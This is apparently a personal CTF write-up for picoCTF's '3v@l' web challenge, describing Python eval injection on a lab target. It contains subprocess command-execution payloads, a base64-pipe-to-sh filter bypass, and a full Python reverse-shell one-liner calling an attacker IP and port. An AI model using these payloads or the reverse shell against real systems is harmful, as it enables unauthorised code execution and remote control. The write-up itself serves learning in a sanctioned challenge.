---
title: 3v@l - PicoCTF
date: 2026-01-26
categories: CTF
tags:
  - web
  - rce
  - picoCTF
---
## Introduction

Hello, 

This is going to be a super short writeup(because I have a work tomorrow T_T) for the **3v@l** challenge on **picoCTF**. I actually didn't have any plan to write about this challenge, but I think my solution is super silly and overkill, so might as well share hehe.

I solved it by getting a *reverse shell* on the server T_T and I'm sure that's not the **intended** solution.

## Recon?

>  Unfortunately, they are using an `eval` function to calculate the loan.

The challenge description gives us a very good hint.

Then, checking the challenge site's source reveals that our input is inside of python's `eval` function. Also, it implements a **regex** filter and blocks common used commands, such as `ls`, `os`, `exec`, `cat` etc...

![Image Description](/images/3v@l-0.png)

## Code Execution

After playing around with it, I was able to use the following payload to run commands:

```python
__import__('subprocess').getoutput('<command>')
```

I accessed `env` but the `flag` wasn't there :(

![Image Description](/images/3v@l-1.png)

Next, I tried to bypass the filter...so instead of `ls` I used `dir`, instead of `cat` I used `tac` xD

But...the `flag` wasn't in the current directory, and since I can't use `/` or `\` I wasn't able to access files in a different directory :(

```python
__import__('subprocess').getoutput('tac *')
```

![Image Description](/images/3v@l-2.png)

```python
__import__('subprocess').getoutput('dir /') # any usage of blocked characters/commands
```

![Image Description](/images/3v@l-3.png)

## Flag.txt

I was getting frustrated so, I decided to go with the easy route(it's getting late after all).

Wallah...I figured I can just `base64` encode the commands I want to run, to bypass the filter, then decode them back to their original form, and finally pass them to `sh` to execute the commands.

```python
__import__('subprocess').getoutput(f'echo <base64_encoded_commands> | base64 -d | sh')
```

At this point, I really just want to solve this challenge :P so I went ahead and `base64` encoded a **python3** reverse shell payload from [https://www.revshells.com/](https://www.revshells.com/) hahahahahaha.

```python
export RHOST="<MY_IP>";export RPORT=<MY_PORT>;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

Finally, I entered the crafted payload, got a reverse shell, then looked for the `flag` lol.

![Image Description](/images/3v@l-4.png)

This was a super fun challenge and it made me realize that `base64` encoding is useful to bypass some filters.

***-Datsuraku147***